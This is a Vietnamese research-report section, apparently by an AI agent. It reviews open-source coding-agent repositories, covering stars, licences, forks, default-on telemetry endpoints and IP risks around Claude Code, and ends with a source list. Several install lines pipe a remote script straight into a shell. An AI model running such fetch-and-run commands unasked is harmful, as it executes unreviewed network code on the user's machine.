> Hai việc. (1) Đọc lại sao, license, trạng thái của các repo mục 01 bằng GitHub search API (31/10/2026). (2) Tìm repo lớn còn thiếu: 6 truy vấn (`coding agent`, topic `coding-agent`, `terminal agent`, `ai coding assistant cli`, `claude code alternative`, repo tạo sau 1/10/2025), lọc bỏ repo đã có trong `data/projects.json`. Chọn **7 repo**, clone `--filter=blob:none` (lịch sử) và `--depth 1` (đọc/grep mã): LICENSE, manifest, cấu trúc gốc, file nguồn chính, workflow CI, grep telemetry/host mạng; đếm commit, tác giả, trailer `Co-Authored-By: Claude`. **Không cài, không chạy script nào của repo.**

### 3i.1 Repo cũ: điều đã đổi

| Repo | Thay đổi (README cũ → 31/10/2026) | Hệ quả |
|---|---|---|
| `sst/opencode` | **Đổi chủ thành `anomalyco/opencode`**; ~210k → 223,6k★ | Bảng 1.1 và catalog nên dùng URL mới (URL cũ chuyển hướng) |
| `RooCodeInc/Roo-Code` | **Đã archive**, push cuối 15/5/2026; 24,3k★ | Không chọn cho dự án mới. Nhánh còn sống là `Kilo-Org/kilocode` (27,8k★, MIT, push 31/10) |
| `block/goose` | Search API trả về **`aaif-goose/goose`** 56k★, Apache-2.0, push 31/10 | Dự án đã chuyển tổ chức; cập nhật URL **(chưa mở được trang chuyển hướng để xác minh)** |
| `deepseek-ai/deepseek-harness` | ~200k → **267,4k★** | Vẫn lớn nhất bảng 1.1 |
| `stablyai/orca` | "chưa rõ (10k–43k)" → **111,7k★** | Hết "chưa xác minh" về số sao; số mới gấp ~2,6 lần mức cao nhất từng ghi |
| `anthropics/claude-code` | ~148k → 154,1k★ | Vẫn mã đóng (GitHub không nhận license) |
| `pingdotgg/t3code` | 27,1k → 35,4k★ | |
| `storytold/filmcraft` / `craft-launcher` | 10,9k → 17,1k★ / 1,56k → 4,4k★ | §3d, §3e; GitHub chỉ hiện `Apache-2.0` vì repo dual `MIT OR Apache-2.0` |
| `Aider-AI/aider` | Push cuối **22/5/2026** | Đã đứng hơn 5 tháng, đúng nhận định "phát triển chậm lại" |
| `smtg-ai/claude-squad` | Push cuối 20/8/2026 | Chậm lại; ADE khác trong §1.3 vẫn push hằng ngày |
| `OpenAI Codex`, `Gemini CLI`, `OpenHands`, `Cline` | 127k → 132,5k · 107k → 108,7k · 90k → 92,4k · 69k → 71,1k | Dao động bình thường |

### 3i.2 Bảng nhanh 7 repo mới

| Repo | Nhóm | ★ · license | Commit cuối | Một dòng | Cờ |
|---|---|---|---|---|---|
| `ultraworkers/claw-code` | CLI agent (Rust) | 195k · MIT | 29/10/2026 | CLI `claw` viết lại bằng Rust, tự nhận là "hiện vật bảo tàng" do agent bảo trì | **Gắn với vụ lộ mã Claude Code**, README khuyên dùng repo khác |
| `openinterpreter/openinterpreter` | CLI agent | 68,8k · Apache-2.0 | 31/10/2026 | **Nay là fork của OpenAI Codex**, có `/harness` giả lập 14 harness khác cho model rẻ | **Metrics gửi Statsig của OpenAI bật sẵn**; nhúng system prompt Claude Code |
| `warpdotdev/warp` | ADE / terminal | 65,8k · AGPL-3.0 + MIT | 30/10/2026 | Client Warp mở mã (4/2026), có agent riêng và chạy được Claude Code/Codex | Server, Drive, Oz vẫn đóng; telemetry bật sẵn |
| `codewhale-hq/Codewhale` | CLI agent (Rust) | 41,2k · MIT | 31/10/2026 | Tên mới của DeepSeek-TUI: 40+ provider, `/receipts` liệt kê mọi thay đổi | Telemetry bật sẵn; link giới thiệu có hoa hồng |
| `can1357/oh-my-pi` | CLI agent | 37,3k · MIT | 31/10/2026 | Fork của Pi (Mario Zechner): LSP, DAP, 60+ provider, lõi Rust | Lịch sử 35k commit, Auto QA ghi cục bộ bật sẵn |
| `QwenLM/qwen-code` | CLI agent | 28,9k · Apache-2.0 | 31/10/2026 | Agent terminal của Alibaba Qwen (gốc Gemini CLI 0.8.2), IDE, desktop, SDK | **Usage stats bật sẵn gửi Aliyun RUM** |
| `xai-org/grok-build` | CLI agent (Rust) | 27,6k · Apache-2.0 | 29/9/2026 | Mã nguồn CLI/TUI `grok` của SpaceXAI, đồng bộ từ monorepo | Không nhận PR; 51 commit đều do bot |

### 3i.3 Hồ sơ từng repo

- **Open Interpreter đổi hẳn bản chất.** Repo 68,8k★ (sao từ thời bản Python 2023) nay là **fork của `openai/codex`**: commit đầu 16/4/2025 của Ilan Bigio (OpenAI), `NOTICE` ghi "OpenAI Codex, Copyright 2025 OpenAI", `FORK_BRANDING.md` giải thích chỉ đổi lớp nhận diện, giữ tên crate `codex-*`. 10.770 commit, 628 tác giả (đa số là commit upstream Codex), bản hiện tại v0.0.57 (31/10). Điểm riêng là `codex-rs/core/src/harness/` với 14 bộ giả lập harness (claude-code, kimi-code, qwen-code, opencode, swe-agent, mini-swe-agent, terminus-2, pi…), chọn bằng `/harness`. ✅ README "Codex-compatible" khớp mã (giữ nguyên exec protocol). ⚠️ **`claude_code_prompt.rs` chép gần như nguyên văn system prompt của Claude Code** (mã đóng, không có license cho phép), cùng kiểu rủi ro sở hữu trí tuệ đã ghi ở mục 06 §7p (baoyu-design). ❌ Về mạng: `OtelConfig::default()` đặt `metrics_exporter = Statsig`, endpoint `https://ab.chatgpt.com/otlp/v1/metrics` kèm khoá client Statsig của OpenAI; TUI gọi với `default_analytics_enabled = true`, chỉ bản debug mới tắt. Nghĩa là bản phát hành gửi metrics về hạ tầng của OpenAI dù đây không phải sản phẩm OpenAI **(đọc mã, chưa chạy để bắt gói)**. Tắt bằng `analytics.enabled = false` trong config. Cài: `curl -fsSL https://www.openinterpreter.com/install | sh` (nên tải script về đọc trước).
- **Warp mở mã client.** Lịch sử công khai bắt đầu 28/4/2026 (tag `repo-sync/watermark/private-to-public`), 2.605 commit, 186 tác giả; người commit nhiều nhất là bot `warp-agent-staging[bot]` (438). License **hai lớp**: crate UI `warpui_core`, `warpui` theo MIT, phần còn lại AGPL-3.0; `FAQ.md` nói rõ server, backend Warp Drive và Oz (lớp điều phối agent) **vẫn đóng**. README ghi OpenAI là "nhà tài trợ sáng lập" của repo mở. Có 80 crate, 293 spec trong `specs/`, 21 workflow. Telemetry RudderStack (`privacy.telemetry_enabled`, mặc định `true`) và crash report Sentry (mặc định `true`), tắt được trong cài đặt. Hệ quả AGPL: nhúng hay dựng dịch vụ từ client phải mở mã phần sửa. Cài: tải từ warp.dev/download; build nguồn theo `./script/presubmit`.
- **Codewhale** là tên mới của DeepSeek-TUI (`LICENSE` vẫn ghi "DeepSeek-TUI Contributors", `codewhale doctor` nhận cả binary `deepseek-tui`). 13.853 commit từ 19/1/2026, 310 tác giả, **18,9% commit có trailer Claude**, bot `CodeWhale Bot` đứng đầu. Có `docs/TELEMETRY.md` rõ ràng: usage analytics **bật sẵn** gửi `telemetry.codewhale.net`, tắt bằng `codewhale config set telemetry false` hoặc `DO_NOT_TRACK=1`; có thư mục `telemetry-ingest/` (mã máy chủ nhận) để đối chiếu. ✅ `/receipts` (danh sách file đổi, lệnh chạy, gọi web/MCP) là điểm đáng học. README đặt banner OrcaRouter và ghi rõ "Codewhale earns a referral fee". Cài: `npm install -g codewhale` hoặc `cargo install codewhale-cli --locked`.
- **oh-my-pi (`omp`)** là fork của Pi (`badlogic/pi-mono`), `LICENSE` MIT ghi ba chủ bản quyền (Mario Zechner, Can Bölük, Stencil Labs). 35.224 commit (gồm lịch sử Pi), tác giả chính can1357 (12.799) và bot `roboomp`. ⚠️ README ghi "~80k dòng Rust core"; đếm thô `crates/` (bỏ `vendor/`) ra ~431k dòng `.rs`, chênh do cách đếm. Mạng: `auth.stencil.so`, `api.stencil.so`; tính năng "Auto QA" (`dev.autoqa`) **bật sẵn** ghi lỗi "grievance" vào DB cục bộ, chỉ đẩy lên `qa.omp.sh` khi người dùng đồng ý (`dev.autoqaConsent` mặc định `unset`). PR vừa mở cho mọi người "thử nghiệm". Cài: `brew install can1357/tap/omp` hoặc `curl -fsSL https://omp.sh/install | sh` (có kiểm SHA-256 cho binary).
- **Qwen Code** (Alibaba). Gốc Gemini CLI v0.8.2, tách hẳn từ v0.1 (README ghi). 11.791 commit, 666 tác giả, v0.26.4; 22 package (CLI, desktop, web-shell, SDK Python/TS/Java, extension VS Code/Zed, kênh chat). **11,6% commit có trailer Claude** dù README nói Qwen Code "tự phát triển bằng agent và model của chính nó". ❌ `privacy.usageStatisticsEnabled` mặc định `true`, `qwen-logger.ts` gửi sự kiện tới `gb4w8c3ygj-default-sea.rum.aliyuncs.com`; README không nhắc. Tắt bằng `"privacy": {"usageStatisticsEnabled": false}` trong settings. Cài: `npm install -g @qwen-code/qwen-code` (Node ≥ 22); script cài một dòng trỏ tới OSS Hàng Châu.
- **Grok Build** (SpaceXAI/xAI). Repo chỉ là **bản đồng bộ một chiều** từ monorepo (`SOURCE_REV`), 51 commit đều của `grokkybara[bot]` từ 16/7/2026, `CONTRIBUTING.md` từ chối mọi PR ngoài. ~2 triệu dòng Rust trong 105 crate. Mạng mặc định: `api.x.ai`, `auth.x.ai`, `cli-chat-proxy.grok.com`. Có crate Mixpanel, Sentry, OTel và upload metadata từng lượt (`PromptMetadata`, schema v1.24 ghi "prompt content is no longer uploaded"). `TelemetryMode` mặc định trong code là `Disabled` ("enterprise default"), nhưng giá trị thật lấy từ cấu hình đám mây **(chưa xác minh hành vi bản phát hành)**. Đứng yên từ 29/9/2026. Cài: `curl -fsSL https://x.ai/cli/install.sh | bash`.
- **claw-code** tạo 31/3/2026 và lên 195k★, cao thứ ba trong mục. README nay tự nhận là **"museum exhibit"** do agent bảo trì, khuyên người muốn làm việc thật chuyển sang LazyCodex (`code-yeongyu`; người commit nhiều nhất claw-code là YeonGyu-Kim, 564/1.858 commit) hoặc Gajae-Code (của tác giả oh-my-claudecode, mục 03 §8g). Phần chạy được là workspace Rust `rust/` (~131k dòng, CLI `claw`, cần `ANTHROPIC_API_KEY`); `src/` là "reference workspace" Python với tên module trùng cấu trúc Claude Code (`QueryEngine.py`, `Tool.py`, `buddy/`…). README có mục "không nhận quyền sở hữu mã nguồn Claude Code gốc". Ngày tạo trùng ngày mã Claude Code bị lộ qua source map npm **(theo tin tức, chưa xác minh trong repo)**. ⚠️ `cargo install claw-code` cài nhầm một stub đã đổi tên. Kho chỉ ghi nhận để tránh, không khuyên dùng.

### 3i.4 Mẫu chung rút ra

1. **Fork là cách ra sản phẩm phổ biến nhất**: Open Interpreter (fork Codex), Qwen Code (Gemini CLI), oh-my-pi (Pi), Codewhale (đổi tên DeepSeek-TUI). Sao của repo không nói gì về mã bên trong: 68,8k★ của Open Interpreter là của một sản phẩm Python đã bị thay toàn bộ.
2. **Telemetry bật sẵn là mặc định của nhóm CLI agent**: Qwen Code, Warp, Codewhale, Open Interpreter (về cả máy chủ của bên thứ ba). Chỉ Codewhale và (một phần) oh-my-pi có tài liệu đủ và hỏi đồng ý. `DO_NOT_TRACK=1` không phủ hết: Qwen Code và Open Interpreter cần khoá config riêng.
3. **"Mở mã" không có nghĩa là nhận đóng góp**: Grok Build từ chối PR, Warp giữ server đóng, oh-my-pi mới mở PR thử nghiệm.
4. **Rủi ro sở hữu trí tuệ quanh Claude Code** lặp lại (claw-code, prompt nhúng trong Open Interpreter): khi tích hợp, grep chuỗi system prompt của bên thứ ba trước khi phân phối lại.
5. **Biên lai hành động** (`/receipts` của Codewhale) là mẫu nên chép cho mọi agent chạy lâu: liệt kê file, lệnh, lời gọi mạng của phiên.

**Nguồn §3i:** GitHub search API 31/10/2026 (6 truy vấn + `repo:` cho `anomalyco/opencode`, `RooCodeInc/Roo-Code`, `Kilo-Org/kilocode`, `aaif-goose/goose`) · `meta_all.json`/`status_all.json` (GitHub API 31/10/2026) · clone `--filter=blob:none` và `--depth 1` 7 repo, đọc: openinterpreter (README.md, FORK_BRANDING.md, NOTICE, `codex-rs/core/src/harness/*`, `codex-rs/otel/src/config.rs`, `codex-rs/config/src/types.rs`, `codex-rs/core/src/otel_init.rs`, `codex-rs/tui/src/startup_orchestration.rs`) · warp (README.md, FAQ.md, LICENSE-AGPL, LICENSE-MIT, `app/src/settings/privacy.rs`, `app/src/server/telemetry/*`, `.claude/settings.json`, `specs/`) · Codewhale (README.md, LICENSE, CHANGELOG.md, docs/TELEMETRY.md, `telemetry-ingest/`) · oh-my-pi (README.md, LICENSE, `packages/coding-agent/src/tools/settings.ts`, `cli/grievances-cli.ts`) · qwen-code (README.md, package.json, `packages/core/src/telemetry/qwen-logger/qwen-logger.ts`, `packages/cli/src/config/settingsSchema.ts`) · grok-build (README.md, CONTRIBUTING.md, SOURCE_REV, LICENSE, `crates/codegen/xai-grok-telemetry/src/{config,client}.rs`, `prod/mc/cli-chat-proxy-types/src/metadata_types.rs`) · claw-code (README.md, LICENSE, PHILOSOPHY.md, concept.md, `rust/`, `src/`, `.github/workflows/`) · https://github.com/anomalyco/opencode · https://github.com/Kilo-Org/kilocode · https://github.com/aaif-goose/goose

## 4. Nguồn

- https://pinggy.io/blog/best_open_source_cli_coding_agents/
- https://www.morphllm.com/best-ai-coding-agents-2026
- https://www.openhands.dev/blog/open-source-ai-coding-agents
- https://stoneforge.ai/blog/open-source-ai-coding-agents/
- https://andrew.ooo/answers/best-open-source-ai-coding-agent-2026-ranked-guide/
- https://thenewstack.io/deepseek-harness-open-source-plugins/
- https://www.mindstudio.ai/blog/deepseek-harness-coding-agent
- https://github.com/OpenHands/OpenHands · https://github.com/SWE-agent/mini-swe-agent · https://github.com/SWE-agent
- https://arxiv.org/html/2604.03515v2 (Inside the Scaffold) · https://arxiv.org/pdf/2609.00006 (Harness Engineering)
- Understand-Anything: https://github.com/Egonex-AI/Understand-Anything · https://github.com/Egonex-AI · https://trendshift.io/repositories/23482 · https://betterstack.com/community/guides/ai/understand-anything/ · https://www.augmentcode.com/learn/understand-anything-71k-stars · https://mcpmarket.com/tools/skills/understand-anything-code-graph · https://github.com/GoodDingo/understand-anything · understand-anything.com
- Personal Jarvis: https://github.com/Dodaios/Dodaios (clone đầy đủ, commit e28f53f) · https://github.com/PersonalJarvis/PersonalJarvis (URL cũ) · https://pypi.org/project/personal-jarvis/ · https://personaljarvis.ai · https://github.com/alvinreal/awesome-opensource-ai/pull/788 · https://github.com/slavakurilyak/awesome-ai-agents/issues/637
- ADE so sánh: https://github.com/pingdotgg/t3code · https://github.com/BloopAI/vibe-kanban · https://github.com/smtg-ai/claude-squad · https://github.com/open-jarvis/OpenJarvis · https://agentsroom.dev/blog/best-multi-agent-coding-tools · https://www.codeagentswarm.com/en/guides/best-tools-to-run-multiple-ai-coding-agents · https://nimbalyst.com/blog/best-multi-agent-desktop-apps-claude-code-codex-2026/ · https://aitoolsatlas.ai/tools/orca-stably/review (Orca, số sao chưa xác minh)
- https://www.vals.ai/benchmarks/swebench · https://arxiv.org/pdf/2609.08149 (SWE-Bench Pro Verified)
- https://codeant.ai/blogs/best-ai-code-editor-cursor-vs-windsurf-vs-copilot · https://www.developersdigest.tech/blog/ai-coding-tools-pricing-2026 · https://levelop.dev/blog/the-best-ai-coding-agents-in-2026-a-practical-ranking-for-working-developers
- §3d FilmCraft (12/10/2026): https://github.com/storytold/filmcraft (lịch sử git đầy đủ; ROADMAP.md, docs/target-app-parity.md, docs/gaps.md, CLAUDE.md, assets/app-icon/README.md; /releases; /issues) · https://getartcraft.com/apps/filmcraft · https://news.ycombinator.com/item?id=49959605 · https://www.it-connect.tech/photocraft-filmcraft-lightcraft-adobes-suite-rebuilt-in-rust-by-claude-opus-5-5-agents/ · PetaPixel, Gizmodo, Phoronix, TweakTown (10/2026) · repo nhái: https://github.com/filmcraft-app/filmcraft · so sánh: https://github.com/OpenCut-app/OpenCut, https://github.com/mifi/lossless-cut, https://github.com/mltframework/shotcut, https://github.com/olive-editor/olive, https://github.com/OpenShot/openshot-qt, https://github.com/KDE/kdenlive
- §3e ArtCraft Launcher (12/10/2026): https://github.com/storytold/craft-launcher (clone đầy đủ, HEAD 1aaf7b2; AGENTS.md, crates/core/src/{catalog,feed,release}.rs, crates/native/src/{install,source,backend}.rs, .github/workflows/ci.yml, packaging/windows/sign.ps1) · issue #90, PR #51, #203, #208, #213 · https://github.com/storytold/craft-launcher-assets · https://github.com/storytold · https://github.com/echelon · https://getartcraft.com/apps · https://github.com/storytold/artcraft-services/pull/70 · https://news.ycombinator.com/item?id=49958850 · https://news.ycombinator.com/item?id=49981449 · https://news.ycombinator.com/item?id=50010170 · https://news.ycombinator.com/item?id=50039007 (craftsuite.net, không chính thức) · https://www.omgubuntu.co.uk/2026/10/artcraft-free-photoshop-ai-clone · https://www.techspot.com/news/114136-software-over-developer-uses-ai-build-free-adobe.html · so sánh: https://github.com/ImranR98/Obtainium, https://github.com/LykosAI/StabilityMatrix, https://github.com/pinokiocomputer/pinokio, https://github.com/mijorus/gearlever
- §3f Omnigent (12/10/2026): https://github.com/omnigent-ai/omnigent (clone đầy đủ, HEAD 87f6f08; README, AGENTS.md, docs/POLICIES.md, omnigent/cli.py, omnigent/server/routes/accounts_auth.py, omnigent/tools/manager.py, omnigent/telemetry/client.py, omnigent/runtime/telemetry.py) · https://github.com/omnigent-ai/omnigent/security/advisories · https://app.opencve.io/cve/CVE-2026-62674 · https://pypi.org/project/omnigent/ · https://pypistats.org/api/packages/omnigent/recent · https://omnigent.ai · https://www.databricks.com/blog/introducing-omnigent-meta-harness-combine-control-and-share-your-agents · https://docs.databricks.com/aws/en/omnigent/ · https://itbrief.co.uk/story/databricks-launches-open-source-omnigent-for-ai-agents · https://atlan.com/know/ai-agent/databricks/what-is-databricks-omnigent-meta-harness/ · https://news.ycombinator.com/item?id=48518176 · so sánh: https://github.com/OpenHands/OpenHands, https://github.com/langchain-ai/langgraph, https://github.com/BloopAI/vibe-kanban, https://github.com/smtg-ai/claude-squad
